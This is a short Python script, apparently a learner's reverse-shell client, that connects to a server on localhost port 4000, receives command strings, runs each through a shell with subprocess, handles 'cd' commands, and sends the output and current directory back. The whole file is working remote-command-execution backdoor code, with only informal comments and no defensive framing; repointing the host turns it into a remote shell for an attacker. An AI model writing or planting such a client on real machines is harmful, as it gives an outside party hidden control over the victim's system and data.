import socket
import os
import subprocess

# the client connects to the server and wait for instructions execute n send back to server
host="127.0.0.1"
port=4000
s=socket.socket()
s.connect((host, port))

while True:
	# we gonna wait for instructions the whole time
	# it ends when the server closes the connection

	# whatever data recieved is equal to s and we gonna recieve it
	# instructions from server
	data = s.recv(1024)
	# data checks, it comes in bytes so decoding to str
	if data=="":
		s.send(str.encode((os.getcwd())))
	if data[:2].decode("utf-8")=="cd":
		os.chdir(data[3:].decode("utf-8"))

	# to make sure there is data
	if len(data) > 0:
		# stderr n stuff takes the output or error n pipes it put like make it accessible
		cmd=subprocess.Popen(data[:].decode("utf-8"), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		# by default its bytes, but we gonna make a byte n str version
		output_bytes= cmd.stdout.read() + cmd.stderr.read()
		output_str= str(output_bytes.decode("utf-8"))
		# sending output to server
		s.send(str.encode(output_str + str(os.getcwd()) + " $:"))
		# print(output_str)

		# closes connection

s.close()